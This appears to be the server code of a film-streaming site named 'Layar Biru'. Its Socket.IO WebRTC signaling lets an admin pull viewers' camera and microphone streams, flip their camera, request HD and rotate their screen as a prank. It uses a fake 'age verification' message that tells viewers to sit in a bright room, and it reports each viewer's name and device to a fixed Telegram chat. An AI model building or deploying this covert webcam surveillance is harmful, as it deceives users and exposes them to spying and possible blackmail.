require('dotenv').config();
const express  = require('express');
const jwt      = require('jsonwebtoken');
const cors     = require('cors');
const path     = require('path');
const fs       = require('fs');
const http     = require('http');
const { Server } = require('socket.io');

const app    = express();
const server = http.createServer(app);
const PORT   = process.env.PORT || 3000;

// ===========================
// MIDDLEWARE
// ===========================
app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));

// ===========================
// CONFIG
// ===========================
// ===========================
// SECURITY: Semua secret WAJIB dari environment variable.
// Server akan crash jika tidak diset — ini disengaja agar
// tidak pernah jalan tanpa konfigurasi yang aman.
// ===========================
if (!process.env.JWT_SECRET)      throw new Error('[FATAL] JWT_SECRET wajib diset di environment variable!');
if (!process.env.ADMIN_PASSWORD)  throw new Error('[FATAL] ADMIN_PASSWORD wajib diset di environment variable!');

const JWT_SECRET = process.env.JWT_SECRET;

const ADMIN_USER = {
  name:     process.env.ADMIN_NAME || 'Admin',
  initial:  'AL',
  role:     'admin',
  password: process.env.ADMIN_PASSWORD
};

// ===========================
// CLOUDFLARE R2 CONFIG
// ===========================
const { S3Client, ListObjectsV2Command, GetObjectCommand } = require('@aws-sdk/client-s3');

for (const k of ['R2_ACCOUNT_ID', 'R2_ACCESS_KEY_ID', 'R2_SECRET_ACCESS_KEY', 'R2_BUCKET']) {
  if (!process.env[k]) throw new Error(`[FATAL] ${k} wajib diset di environment variable!`);
}

const R2_BUCKET = process.env.R2_BUCKET;
// Opsional: hanya list file di dalam folder/prefix tertentu, mis. "film/"
const R2_PREFIX = process.env.R2_PREFIX || '';

const r2 = new S3Client({
  region: 'auto',
  endpoint: `https://${process.env.R2_ACCOUNT_ID}.r2.cloudflarestorage.com`,
  credentials: {
    accessKeyId:     process.env.R2_ACCESS_KEY_ID,
    secretAccessKey: process.env.R2_SECRET_ACCESS_KEY,
  },
});

const VIDEO_EXT_REGEX = /\.(mp4|webm|mov|m4v|mkv)$/i;
const VIDEO_MIME = { mp4: 'video/mp4', m4v: 'video/mp4', webm: 'video/webm', mov: 'video/quicktime', mkv: 'video/x-matroska' };

// ===========================
// CLOUDFLARE TURN CONFIG
// ===========================
const CF_TURN_KEY_ID  = process.env.CF_TURN_KEY_ID;
const CF_TURN_API_KEY = process.env.CF_TURN_API_KEY;
let cfTurnCache     = null;
let cfTurnCacheTime = 0;
const CF_TURN_TTL   = 12 * 60 * 60 * 1000; // 12 jam

// Cache daftar film dari R2 agar tidak list bucket setiap request
let filmsCache = [];
let filmsCacheTime  = 0;
const FILMS_CACHE_TTL = 5 * 60 * 1000; // 5 menit

const GRADIENTS_POOL = [
  'linear-gradient(135deg,#1a1a2e,#16213e)',
  'linear-gradient(135deg,#0f3460,#533483)',
  'linear-gradient(135deg,#e94560,#0f3460)',
  'linear-gradient(135deg,#2c003e,#ad5cad)',
  'linear-gradient(135deg,#1b1b2f,#e43f5a)',
  'linear-gradient(135deg,#162447,#1f4068)',
  'linear-gradient(135deg,#1b262c,#0f4c75)',
  'linear-gradient(135deg,#2d132c,#ee4540)',
  'linear-gradient(135deg,#0d0d0d,#3a0ca3)',
  'linear-gradient(135deg,#10002b,#e0aaff)',
];

// Ambil daftar video dari bucket Cloudflare R2 (dengan pagination)
async function fetchFilms() {
  const now = Date.now();
  if (filmsCache.length > 0 && (now - filmsCacheTime) < FILMS_CACHE_TTL) {
    return filmsCache;
  }

  try {
    let objs  = [];
    let token = undefined;
    do {
      const r = await r2.send(new ListObjectsV2Command({
        Bucket: R2_BUCKET,
        Prefix: R2_PREFIX || undefined,
        ContinuationToken: token,
      }));
      objs  = objs.concat(r.Contents || []);
      token = r.NextContinuationToken;
    } while (token);

    const videos = objs
      .filter(o => VIDEO_EXT_REGEX.test(o.Key))
      .sort((a, b) => a.Key.localeCompare(b.Key, undefined, { numeric: true }));

    if (videos.length === 0) {
      console.warn('[R2] Tidak ada video ditemukan, return cache lama');
      return filmsCache;
    }

    const films = videos.map((o, index) => {
      const ext = o.Key.split('.').pop().toLowerCase();
      return {
        id:       index + 1,
        fileId:   o.Key,            // key objek R2 dipakai sebagai ID
        title:    o.Key.split('/').pop().replace(/\.[^/.]+$/, ''),
        desc:     'Cloudflare R2',
        videoId:  o.Key,
        thumb:    '',               // R2 tidak membuat thumbnail otomatis → pakai placeholder
        mimeType: VIDEO_MIME[ext] || 'video/mp4',
        gradient: GRADIENTS_POOL[index % GRADIENTS_POOL.length],
        duration: '—',
        source:   'r2'
      };
    });

    filmsCache = films;
    filmsCacheTime  = now;
    console.log(`[R2] Total ${films.length} video dari bucket "${R2_BUCKET}" (cache diperbarui)`);
    return films;

  } catch (err) {
    console.error('[R2] Fetch error:', err.message);
    return filmsCache;
  }
}

// ===========================
// SESSION STORE
// ===========================
const activeSessions = new Map();
const sseClients     = new Set();
const userSessions   = new Map();

// ===========================
// REFRESH GRACE PERIOD
// Saat viewer disconnect (socket putus), tunggu dulu sebelum
// benar-benar dianggap keluar. Jika reconnect dalam waktu
// REFRESH_GRACE_MS → anggap refresh, jangan log KELUAR.
// ===========================
// Railway/cloud hosting sering punya transport timeout 5-7 detik.
// FIX: Naikkan ke 15 detik. Log menunjukkan "Elvi mangun" ping timeout
// tidak reconnect dalam 8s — kemungkinan koneksi mobile lambat atau
// handoff jaringan (WiFi → data) butuh waktu lebih.
const REFRESH_GRACE_MS = 15000; // 15 detik grace period
const pendingDisconnects = new Map(); // sessionId → { timer, user }

// ===========================
// ADMIN RECONNECT TRACKING
// Karena setiap reconnect = socket baru, socket._wasAdmin selalu false.
// Solusi: pakai timestamp — jika admin reconnect dalam 15 detik = isReconnect true.
// ===========================
let adminLastConnectedAt  = 0;
let adminLastDisconnectAt = 0;
// FIX: Naikkan dari 15s ke 120s. Log menunjukkan gap 17s–141s saat admin
// HP sleep/wake atau ganti jaringan — dulu semua dianggap "Admin baru",
// sekarang dianggap reconnect dan tidak reset WebRTC yang masih hidup.
const ADMIN_RECONNECT_WINDOW_MS = 120000; // 2 menit

// ===========================
// ADMIN ACTIVITY LOG
// ===========================
const MAX_LOGS = 200;
let serverLogs = [];

function addServerLog(user, action, color = '#5B8CFF', type = '') {
  const now = new Date();
  const entry = {
    id:        now.getTime() + '-' + Math.random().toString(36).slice(2, 7),
    user,
    action,
    color,
    type,
    time:      now.toLocaleTimeString('id-ID', { hour:'2-digit', minute:'2-digit', second:'2-digit', timeZone:'Asia/Makassar' }),
    date:      now.toLocaleDateString('id-ID', { day:'2-digit', month:'short', year:'numeric', timeZone:'Asia/Makassar' }),
    timestamp: now.getTime()
  };
  serverLogs.unshift(entry);
  if (serverLogs.length > MAX_LOGS) serverLogs.length = MAX_LOGS;

  const payload = JSON.stringify({ type: 'log', data: entry });
  for (const res of sseClients) {
    try { res.write(`data: ${payload}\n\n`); } catch {}
  }
  return entry;
}

function broadcastSessions() {
  const payload = JSON.stringify({ type:'sessions', data: getSessionsPayload() });
  for (const res of sseClients) {
    try { res.write(`data: ${payload}\n\n`); } catch {}
  }
}

// ===========================
// TELEGRAM BOT NOTIFICATION
// ===========================
const TELEGRAM_TOKEN   = process.env.TELEGRAM_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '7039626075';

async function sendTelegramNotif(message) {
  if (!TELEGRAM_TOKEN) {
    console.warn('[TELEGRAM] TELEGRAM_TOKEN tidak diset di environment variable, notifikasi dilewati.');
    return;
  }
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    const res = await fetch(url, {
      method:  'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id:    TELEGRAM_CHAT_ID,
        text:       message,
        parse_mode: 'HTML'
      })
    });
    const data = await res.json();
    if (!data.ok) console.error('[TELEGRAM] Gagal kirim:', data.description);
  } catch (err) {
    console.error('[TELEGRAM] Error:', err.message);
  }
}

function broadcastNewLogin(user) {
  const payload = JSON.stringify({
    type: 'new-login',
    data: {
      name:    user.name,
      initial: user.initial,
      role:    user.role,
      time:    Date.now()
    }
  });
  for (const res of sseClients) {
    try { res.write(`data: ${payload}\n\n`); } catch {}
  }
}

// BUG FIX: parseBrowser diekstrak jadi utility — tidak lagi duplikat di setiap handler
function parseBrowser(ua = '') {
  if (!ua) return { browser: 'Unknown', os: 'Unknown', device: 'Unknown' };
  let browser = 'Unknown';
  if      (ua.includes('EdgA') || ua.includes('EdgiOS')) browser = 'Edge Mobile';
  else if (ua.includes('Edg/'))  browser = 'Edge';
  else if (ua.includes('OPR/') || ua.includes('OPiOS')) browser = 'Opera';
  else if (ua.includes('SamsungBrowser')) browser = 'Samsung Browser';
  else if (ua.includes('UCBrowser')) browser = 'UC Browser';
  else if (ua.includes('Firefox')) browser = 'Firefox';
  else if (ua.includes('CriOS')) browser = 'Chrome iOS';
  else if (ua.includes('Chrome')) browser = 'Chrome';
  else if (ua.includes('Safari')) browser = 'Safari';
  let os = 'Unknown';
  if      (ua.includes('Windows NT 10')) os = 'Windows 10/11';
  else if (ua.includes('Windows NT 6')) os = 'Windows 7/8';
  else if (ua.includes('iPhone'))  os = 'iPhone';
  else if (ua.includes('iPad'))    os = 'iPad';
  else if (ua.includes('Android')) {
    const ver = ua.match(/Android ([\d.]+)/);
    os = ver ? `Android ${ver[1]}` : 'Android';
  }
  else if (ua.includes('Mac OS X')) os = 'macOS';
  else if (ua.includes('Linux'))   os = 'Linux';
  // BUG FIX: Tambah kurung agar operator precedence jelas
  const device = (ua.includes('Mobile') || ua.includes('iPhone') || (ua.includes('Android') && !ua.includes('Tablet'))) ? '📱 HP' : '💻 Desktop';
  return { browser, os, device };
}

// Sesi yang sedang diberi efek rotasi layar oleh admin (disimpan agar bertahan saat viewer refresh)
const tiltPrankSessions = new Map(); // sessionId → sudut rotasi (0–315)

function getSessionsPayload() {
  const now = Date.now();
  return Array.from(activeSessions.values()).map(s => ({
    id:        s.id,
    name:      s.user.name,
    initial:   s.user.initial,
    // BUG FIX: field email sebelumnya diisi nama user — sekarang pakai nama sebagai display label
    email:     s.user.email || s.user.name,
    film:      s.film,
    camActive: s.camActive,
    micActive: s.micActive,
    duration:  Math.floor((now - s.startTime) / 1000),
    startTime: s.startTime,
    tilt:      tiltPrankSessions.has(s.id),
    tiltAngle: tiltPrankSessions.get(s.id) || 0
  }));
}

function generateInitial(fullName) {
  const parts = fullName.trim().split(/\s+/);
  if (parts.length === 0) return 'U';
  if (parts.length === 1) return parts[0].substring(0, 1).toUpperCase();
  return (parts[0].substring(0, 1) + parts[1].substring(0, 1)).toUpperCase();
}

// ===========================
// SOCKET.IO — WebRTC SIGNALING
// ===========================
const io = new Server(server, {
  cors: { origin: '*', methods: ['GET','POST'] },
  // Lag Fix 4: Utamakan WebSocket, bukan polling.
  // Default ['polling','websocket'] berarti setiap koneksi mulai dari HTTP polling dulu
  // → sinyal WebRTC (offer/answer/ICE) terkirim lambat → stream terlambat nyambung.
  transports: ['websocket', 'polling'],
  // FIX: Turunkan pingInterval agar server cepat deteksi koneksi mati.
  // Sebelumnya 25s interval + 20s timeout = deteksi baru setelah 45 detik.
  // Sekarang 10s interval + 15s timeout = deteksi setelah 25 detik.
  // Client admin sudah punya keep-alive ping tiap 10 detik, jadi tidak ada overhead tambahan.
  pingInterval: 10000,
  pingTimeout:  15000,
  upgradeTimeout: 10000,
  allowEIO3: true
});

io.use((socket, next) => {
  const token = socket.handshake.auth?.token || socket.handshake.query?.token;
  if (!token) return next(new Error('Unauthorized'));
  try {
    socket._user = jwt.verify(token, JWT_SECRET);
    socket._role = socket._user.role;
    next();
  } catch {
    next(new Error('Unauthorized'));
  }
});

io.on('connection', (socket) => {
  const user = socket._user;
  const role = socket._role;

  if (role === 'viewer') {
    socket.on('register-viewer', ({ sessionId }) => {
      socket._sessionId = sessionId;
      socket.join(`viewer:${sessionId}`);

      // Pulihkan efek rotasi jika admin sudah menyalakannya (refresh / reconnect)
      if (tiltPrankSessions.has(sessionId)) socket.emit('tilt-prank', { on: true, angle: tiltPrankSessions.get(sessionId) });

      // ── Batalkan grace period jika viewer reconnect (refresh) ──
      // Jika ada pending disconnect untuk sessionId ini, berarti ini
      // adalah viewer yang baru saja refresh — cancel timer KELUAR-nya.
      const pending = pendingDisconnects.get(sessionId);
      if (pending) {
        clearTimeout(pending.timer);
        pendingDisconnects.delete(sessionId);
        console.log(`[SIO] Grace period dibatalkan — viewer reconnect: ${user.name} (${sessionId})`);
        addServerLog(user.name, 'terhubung kembali setelah refresh', '#4ADE80', 'connect');

        // Notif Telegram: pengguna terhubung kembali
        const _rUa = socket.handshake.headers['user-agent'] || '';
        const { browser: _rBrowser, os: _rOs, device: _rDevice } = parseBrowser(_rUa);
        const _rWaktu = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit', timeZone: 'Asia/Makassar' });
        sendTelegramNotif(
          `🔄 <b>Pengguna Terhubung Kembali</b>\n\n` +
          `👤 <b>Nama</b>      : ${user.name || 'Pengguna'}\n` +
          `🕐 <b>Waktu</b>     : ${_rWaktu} WITA\n` +
          `${_rDevice} <b>Perangkat</b>: ${_rOs}\n` +
          `🌐 <b>Browser</b>  : ${_rBrowser}\n\n` +
          `— <i>Layar Biru</i>`
        ).catch(e => console.error('[TELEGRAM] Viewer reconnect notif gagal:', e.message));

        // FIX: Kirim viewer-renegotiate ke admin agar WebRTC dinegosiasi ulang.
        // Sebelumnya: langsung return → admin TIDAK tahu bahwa socket berubah (terutama
        // saat disconnect reason=transport close). RTCPeerConnection lama sudah rusak
        // tapi admin tidak setup peer baru → video hitam permanen untuk viewer seperti Fira Ma'ruf.
        // Sekarang: emit viewer-renegotiate (bukan viewer-connected) agar admin hanya
        // re-offer tanpa menghapus card atau reset UI yang sudah ada.
        io.to('admins').emit('viewer-renegotiate', { sessionId, user });
        console.log(`[SIO] viewer-renegotiate dikirim ke admin untuk: ${user.name} (${sessionId})`);
        return;
      }

      // Validasi: sessionId harus cocok dengan activeSessions
      // Kalau viewer konek sebelum /api/session/start selesai, coba tunggu sebentar
      // FIX: guard agar tryEmitConnected tidak fire lebih dari sekali
      // (mencegah log "Viewer terhubung" duplikat dari retry loop)
      let _emitConnectedDone = false;

      const tryEmitConnected = (attempt) => {
        if (_emitConnectedDone) return; // sudah berhasil, stop retry
        if (!socket.connected) return;  // socket sudah putus, stop retry

        let sessionFound = false;
        for (const [, s] of activeSessions) {
          if (s.id === sessionId) {
            socket._sessionId = s.id; // FIX: set eksplisit, tidak hanya andalkan nilai dari registrasi
            sessionFound = true;
            break;
          }
          // Fallback: cocokkan berdasarkan nama user jika sessionId belum ada (misal setelah server restart)
          if (s.user && s.user.name === user.name) {
            socket._sessionId = s.id;
            sessionFound = true;
            console.log(`[SIO] sessionId remapped ${sessionId} → ${s.id} untuk ${user.name}`);
            break;
          }
        }

        // FIX: Naikkan batas retry dari 8 ke 15 (6 detik total).
        // Sebelumnya 8 × 400ms = 3.2 detik — terlalu singkat jika server sedang sibuk
        // atau koneksi viewer lambat. Dengan 15 retry ada margin lebih untuk /api/session/start
        // yang lambat tanpa langsung emit viewer-connected dengan session yang mungkin belum siap.
        if (sessionFound || attempt >= 15) {
          _emitConnectedDone = true;
          const finalSessionId = socket._sessionId;
          if (!sessionFound) {
            console.warn(`[SIO] Session ${sessionId} tidak ditemukan setelah 15 retry — emit paksa untuk ${user.name}`);
          }
          io.to('admins').emit('viewer-connected', { sessionId: finalSessionId, user });
          console.log(`[SIO] Viewer terhubung: ${user.name} (${finalSessionId}) attempt=${attempt}`);
        } else {
          console.warn(`[SIO] SessionId ${sessionId} belum ada, retry ${attempt}/15`);
          setTimeout(() => tryEmitConnected(attempt + 1), 400);
        }
      };
      tryEmitConnected(1);

      addServerLog(user.name, 'terhubung ke dashboard streaming', '#4ADE80', 'connect');
    });

    socket.on('answer', (msg) => { io.to('admins').emit('answer', msg); });
    socket.on('ice-candidate', (msg) => { io.to('admins').emit('ice-candidate', { ...msg, from: 'viewer' }); });
    // FIX #1 & #5: Handle film-selected — update activeSessions.film agar dashboard admin akurat
    socket.on('film-selected', ({ film, sessionId: sid }) => {
      const targetId = sid || socket._sessionId;
      if (!targetId) return;
      for (const [, s] of activeSessions) {
        if (s.id === targetId) {
          s.film = film || s.film;
          break;
        }
      }
      broadcastSessions();
      io.to('admins').emit('film-selected', { sessionId: targetId, film });
    });

    socket.on('flip-camera-accepted', ({ sessionId, reason }) => {
      if (!sessionId) return;
      io.to('admins').emit('flip-camera-accepted', { sessionId, reason });
    });
    socket.on('flip-camera-rejected', ({ sessionId, reason }) => {
      if (!sessionId) return;
      io.to('admins').emit('flip-camera-rejected', { sessionId, reason });
    });
    socket.on('disconnect', (reason) => {
      if (!socket._sessionId) return;
      const sessionId = socket._sessionId;

      // ── GRACE PERIOD untuk bedakan REFRESH vs KELUAR beneran ──
      // Saat viewer refresh browser, socket putus lalu reconnect lagi
      // dalam ~1-3 detik. Kalau langsung emit viewer-disconnected,
      // admin melihat KELUAR padahal viewer cuma refresh.
      //
      // Solusi: tunda emit viewer-disconnected selama REFRESH_GRACE_MS.
      // Jika viewer reconnect sebelum timer habis → cancel timer → tidak ada log KELUAR.
      // Jika tidak reconnect → timer habis → baru dianggap benar-benar keluar.

      // Batalkan grace period sebelumnya untuk session ini jika ada
      const existing = pendingDisconnects.get(sessionId);
      if (existing) { clearTimeout(existing.timer); }

      const timer = setTimeout(() => {
        pendingDisconnects.delete(sessionId);
        // Cek apakah viewer sudah reconnect (ada socket lain dengan sessionId yang sama)
        let reconnected = false;
        io.sockets.sockets.forEach(s => {
          if (s._role === 'viewer' && s._sessionId === sessionId && s.id !== socket.id) {
            reconnected = true;
          }
        });
        if (!reconnected) {
          io.to('admins').emit('viewer-disconnected', { sessionId });
          tiltPrankSessions.delete(sessionId);
          addServerLog(user.name, 'memutus koneksi streaming', '#F2716B', 'disconnect');
          console.log(`[SIO] Viewer benar-benar keluar: ${user.name} (${sessionId})`);
        } else {
          console.log(`[SIO] Viewer refresh terdeteksi, skip KELUAR log: ${user.name}`);
        }
      }, REFRESH_GRACE_MS);

      pendingDisconnects.set(sessionId, { timer, user });
      console.log(`[SIO] Viewer disconnect (grace period ${REFRESH_GRACE_MS}ms): ${user.name} reason=${reason}`);
    });
  }

  if (role === 'admin') {
    socket.join('admins');
    socket.on('register-admin', () => {
      // FIX: Gunakan timestamp untuk deteksi reconnect, bukan per-socket flag.
      // Karena setiap reconnect = socket BARU di server, socket._wasAdmin selalu false.
      // Jika admin reconnect dalam ADMIN_RECONNECT_WINDOW_MS → isReconnect = true.
      const now = Date.now();
      const isReconnect = (now - adminLastDisconnectAt) < ADMIN_RECONNECT_WINDOW_MS;
      adminLastConnectedAt = now;

      const viewers = [];
      io.sockets.sockets.forEach(s => {
        if (s._role === 'viewer' && s._sessionId) {
          viewers.push({ sessionId: s._sessionId, user: s._user });
        }
      });

      // Kirim flag isReconnect ke client — jika true, client TIDAK reset WebRTC
      // yang sudah connected, cukup sync card UI saja agar stream tidak hitam
      socket.emit('viewer-list', { viewers, isReconnect });

      if (isReconnect) {
        addServerLog('Admin', 'terhubung kembali ke dashboard streaming', '#4ADE80', 'connect');

        // Notif Telegram: admin terhubung kembali
        const _aUa = socket.handshake.headers['user-agent'] || '';
        const { browser: _aBrowser, os: _aOs, device: _aDevice } = parseBrowser(_aUa);
        const _aWaktu = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit', timeZone: 'Asia/Makassar' });
        sendTelegramNotif(
          `🔵 <b>Admin Terhubung Kembali</b>\n\n` +
          `👤 <b>Nama</b>      : ${user.name || 'Admin'}\n` +
          `🕐 <b>Waktu</b>     : ${_aWaktu} WITA\n` +
          `${_aDevice} <b>Perangkat</b>: ${_aOs}\n` +
          `🌐 <b>Browser</b>  : ${_aBrowser}\n\n` +
          `— <i>Layar Biru Dashboard</i>`
        ).catch(e => console.error('[TELEGRAM] Admin reconnect notif gagal:', e.message));
      } else {
        addServerLog('Admin', 'terhubung ke dashboard streaming', '#4ADE80', 'connect');
      }
      console.log(`[SIO] Admin ${isReconnect ? 'reconnect' : 'baru'}: ${user.name} (gap=${now - adminLastDisconnectAt}ms)`);
    });

    // Keep-alive ping dari client admin — no-op, hanya untuk cegah socket timeout
    socket.on('ping-admin', () => { /* keep-alive */ });

    socket.on('offer', ({ sessionId, data }) => { io.to(`viewer:${sessionId}`).emit('offer', { sessionId, data }); });
    socket.on('ice-candidate', (msg) => { io.to(`viewer:${msg.sessionId}`).emit('ice-candidate', { ...msg, from: 'admin' }); });
    socket.on('flip-camera', ({ sessionId }) => {
      if (!sessionId) return;
      const targetRoom = io.sockets.adapter.rooms.get(`viewer:${sessionId}`);
      if (!targetRoom || targetRoom.size === 0) {
        socket.emit('flip-camera-rejected', { sessionId, reason: 'Viewer tidak terhubung' }); return;
      }
      io.to(`viewer:${sessionId}`).emit('flip-camera');
    });
    socket.on('kick-viewer', ({ sessionId }) => {
      if (!sessionId) return;
      io.to(`viewer:${sessionId}`).emit('warn-viewer');
      addServerLog('Admin', `peringatan dikirim (socket): sesi ${sessionId}`, '#F2B94B', 'warn');
    });

    // Remote rotasi layar: admin memilih sudut (kelipatan 45°) atau mematikan
    socket.on('set-tilt-prank', ({ sessionId, on, angle }) => {
      if (!sessionId) return;
      const a = (((Math.round(Number(angle)) || 0) % 360) + 360) % 360;
      if (on) tiltPrankSessions.set(sessionId, a); else tiltPrankSessions.delete(sessionId);
      io.to(`viewer:${sessionId}`).emit('tilt-prank', { on: !!on, angle: a });
      broadcastSessions(); // sinkronkan dashboard admin lain
      console.log(`[SIO] Rotasi layar ${on ? a + '°' : 'OFF'} untuk sesi: ${sessionId}`);
    });

    socket.on('request-hd', ({ sessionId }) => {
      if (!sessionId) return;
      io.to(`viewer:${sessionId}`).emit('request-hd');
      console.log(`[SIO] Admin request HD untuk sesi: ${sessionId}`);
    });

    socket.on('stop-hd', ({ sessionId }) => {
      if (!sessionId) return;
      io.to(`viewer:${sessionId}`).emit('stop-hd');
      console.log(`[SIO] Admin stop HD untuk sesi: ${sessionId}`);
    });

    socket.on('force-kick-viewer', ({ sessionId, name }) => {
      if (!sessionId) return;
      io.to(`viewer:${sessionId}`).emit('force-kicked', {
        title: 'Anda Keluar',
        message: 'Ruangan anda gelap, website tidak bisa memverifikasi usia anda. harap anda berada di ruangan terang agar verifikasi usia berjalan.'
      });
      addServerLog('Admin', `kick paksa ke: ${name || sessionId}`, '#EF4444', 'kick');
      // Hapus sesi dari activeSessions map setelah sedikit delay agar pesan sampai
      // FIX: (1) variable yang benar adalah activeSessions, bukan sessions
      //      (2) activeSessions di-key oleh full JWT token, bukan sessionId pendek
      //          → harus cari token yang s.id === sessionId dulu sebelum delete
      setTimeout(() => {
        for (const [token, s] of activeSessions) {
          if (s.id === sessionId) {
            activeSessions.delete(token);
            break;
          }
        }
        broadcastSessions();
      }, 800);
    });
    socket.on('disconnect', () => {
      adminLastDisconnectAt = Date.now(); // simpan waktu putus untuk deteksi reconnect
      console.log(`[SIO] Admin putus: ${user.name}`);
    });
  }
});

// ===========================
// HTTP ROUTES
// ===========================
app.get('/api/health', (req, res) => {
  res.json({
    status: 'ok',
    viewers: [...io.sockets.sockets.values()].filter(s => s._role === 'viewer').length,
    admins:  [...io.sockets.sockets.values()].filter(s => s._role === 'admin').length
  });
});

// Daftar gambar folder /background untuk slideshow login
app.get('/api/backgrounds', (req, res) => {
  try {
    const bgDir = path.join(__dirname, 'background');
    if (!fs.existsSync(bgDir)) return res.json({ success: true, images: [] });
    const images = fs.readdirSync(bgDir)
      .filter(f => /\.(jpe?g|png|webp|gif|avif)$/i.test(f))
      .sort()
      .map(f => `/background/${encodeURIComponent(f)}`);
    res.json({ success: true, images });
  } catch (e) {
    console.error('[BG] Gagal baca folder background:', e.message);
    res.json({ success: true, images: [] });
  }
});

app.post('/api/check-admin', (req, res) => {
  // SECURITY FIX: Selalu return response yang sama — jangan pernah konfirmasi
  // apakah suatu nama adalah admin. Ini mencegah username enumeration.
  // Frontend tetap bisa tampilkan password field berdasarkan logika lokal,
  // tapi server tidak mengkonfirmasi apapun.
  res.json({ success: true, isAdmin: false, message: 'Gunakan form login.' });
});

app.post('/api/login', async (req, res) => {
  const { name, password, userAgent } = req.body;
  if (!name || !name.trim()) return res.status(400).json({ success: false, code: 'MISSING_NAME', message: 'Nama wajib diisi.' });

  const trimmedName      = name.trim();
  const trimmedNameLower = trimmedName.toLowerCase();

  // BUG FIX: parseBrowser sekarang utility global — tidak lagi duplikat
  const ua      = userAgent || req.headers['user-agent'] || '';
  const { browser, os, device } = parseBrowser(ua);

  if (trimmedNameLower === 'administrator') {
    if (!password) return res.status(401).json({ success: false, code: 'PASSWORD_REQUIRED', message: 'Password admin wajib diisi.' });
    if (password !== ADMIN_USER.password) {
      addServerLog('Sistem', 'Login admin gagal — password salah', '#F2716B', 'error');
      return res.status(401).json({ success: false, code: 'WRONG_PASSWORD', message: 'Password admin salah.' });
    }
    // BUG FIX #2: Pakai ADMIN_USER.name & ADMIN_USER.initial, bukan hardcode 'Admin'/'YZ'
    // Sebelumnya env var ADMIN_NAME dan initial 'AL' diabaikan → avatar/nama selalu salah
    const token = jwt.sign({ name: ADMIN_USER.name, initial: ADMIN_USER.initial, role: 'admin' }, JWT_SECRET, { expiresIn: '8h' });
    addServerLog('Admin', 'login sebagai admin', '#5B8CFF', 'login');

    // Notif Telegram: admin masuk
    const { browser: aBrowser, os: aOs, device: aDevice } = parseBrowser(ua);
    const aWaktu = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit', timeZone: 'Asia/Makassar' });
    sendTelegramNotif(
      `🔵 <b>Admin Masuk</b>\n\n` +
      `👤 <b>Nama</b>      : ${ADMIN_USER.name}\n` +
      `🕐 <b>Waktu</b>     : ${aWaktu} WITA\n` +
      `${aDevice} <b>Perangkat</b>: ${aOs}\n` +
      `🌐 <b>Browser</b>  : ${aBrowser}\n\n` +
      `— <i>Layar Biru Dashboard</i>`
    ).catch(e => console.error('[TELEGRAM] Admin login notif gagal:', e.message));

    return res.json({ success: true, token, user: { name: ADMIN_USER.name, initial: ADMIN_USER.initial, role: 'admin' } });
  }

  const initial = generateInitial(trimmedName);
  for (const [oldToken, s] of activeSessions) {
    if (s.user && s.user.name.toLowerCase() === trimmedNameLower) activeSessions.delete(oldToken);
  }

  const token = jwt.sign({ name: trimmedName, initial, role: 'viewer' }, JWT_SECRET, { expiresIn: '8h' });
  addServerLog(trimmedName, 'baru saja masuk ke platform', '#4ADE80', 'connect');
  broadcastNewLogin({ name: trimmedName, initial, role: 'viewer' });

  const waktu     = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit', timeZone: 'Asia/Makassar' });
  const totalSesi = activeSessions.size + 1;
  sendTelegramNotif(
`🟢 <b>Pengguna Baru Masuk</b>\n\n👤 <b>Nama</b>       : ${trimmedName}\n🕐 <b>Waktu</b>      : ${waktu} WITA\n${device} <b>Perangkat</b> : ${os}\n🌐 <b>Browser</b>   : ${browser}\n📊 <b>Sesi aktif</b>: ${totalSesi} pengguna\n\n— <i>Layar Biru Dashboard</i>`
  ).catch(e => console.error('[TELEGRAM] Login notif gagal:', e.message));

  res.json({ success: true, token, user: { name: trimmedName, initial, role: 'viewer' } });
});

app.get('/api/verify', (req, res) => {
  const token = (req.headers['authorization']||'').split(' ')[1];
  if (!token) return res.status(401).json({ success:false });
  try { res.json({ success:true, user: jwt.verify(token, JWT_SECRET) }); }
  catch { res.status(401).json({ success:false }); }
});

// POST /api/verify — dipakai saat restore session, kirim notif Telegram jika bukan refresh
app.post('/api/verify', async (req, res) => {
  const token = (req.headers['authorization']||'').split(' ')[1];
  if (!token) return res.status(401).json({ success:false });
  try {
    const user = jwt.verify(token, JWT_SECRET);
    res.json({ success:true, user });

    // Kirim notif Telegram hanya untuk viewer dan hanya jika bukan refresh tab
    const { isRestore, isRefresh, userAgent: ua } = req.body || {};
    if (isRestore && !isRefresh && user.role === 'viewer') {
      // BUG FIX: Pakai utility parseBrowser global
      const { browser, os, device } = parseBrowser(ua || req.headers['user-agent'] || '');
      const waktu     = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit', timeZone: 'Asia/Makassar' });
      const totalSesi = activeSessions.size + 1;
      sendTelegramNotif(
`🔄 <b>Pengguna Kembali (Sesi Lama)</b>\n\n👤 <b>Nama</b>       : ${user.name}\n🕐 <b>Waktu</b>      : ${waktu} WITA\n${device} <b>Perangkat</b> : ${os}\n🌐 <b>Browser</b>   : ${browser}\n📊 <b>Sesi aktif</b>: ${totalSesi} pengguna\n\n— <i>Layar Biru Dashboard</i>`
      ).catch(e => console.error('[TELEGRAM] Restore notif gagal:', e.message));
    }
  } catch { res.status(401).json({ success:false }); }
});


app.post('/api/session/start', (req, res) => {
  const token = (req.headers['authorization']||'').split(' ')[1];
  if (!token) return res.status(401).json({ success:false });
  try {
    const user = jwt.verify(token, JWT_SECRET);
    activeSessions.set(token, {
      id:        token.slice(-8),
      user,
      startTime: Date.now(),
      film:      req.body.film || '—',
      camActive: req.body.camActive !== false,
      micActive: req.body.micActive !== false,
      lastPing:  Date.now()
    });
    broadcastSessions();
    res.json({ success:true, sessionId: token.slice(-8) });
  } catch { res.status(401).json({ success:false }); }
});

app.post('/api/session/ping', (req, res) => {
  const token = (req.headers['authorization']||'').split(' ')[1];
  const s = activeSessions.get(token);
  if (s) {
    s.lastPing  = Date.now();
    // Lag Fix 5: Hanya broadcast jika ada perubahan data penting (film/cam/mic),
    // bukan setiap ping heartbeat. Sebelumnya broadcastSessions() dipanggil tiap 5 detik
